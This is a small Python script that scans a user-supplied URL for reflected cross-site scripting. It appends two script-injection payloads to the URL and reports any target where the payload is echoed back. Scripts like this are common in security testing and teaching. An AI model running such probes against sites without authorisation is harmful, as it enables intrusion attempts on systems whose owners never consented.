import requests

payloads = [
    "<script>alert(1)</script>",
    "'\"><script>alert(1)</script>"
]

url = input("Enter target URL: ")

for payload in payloads:
    target = url + payload

    try:
        r = requests.get(target)

        if payload in r.text:
            print("[+] Possible XSS:", target)
        else:
            print("[-] Not vulnerable")

    except:
        print("Connection error")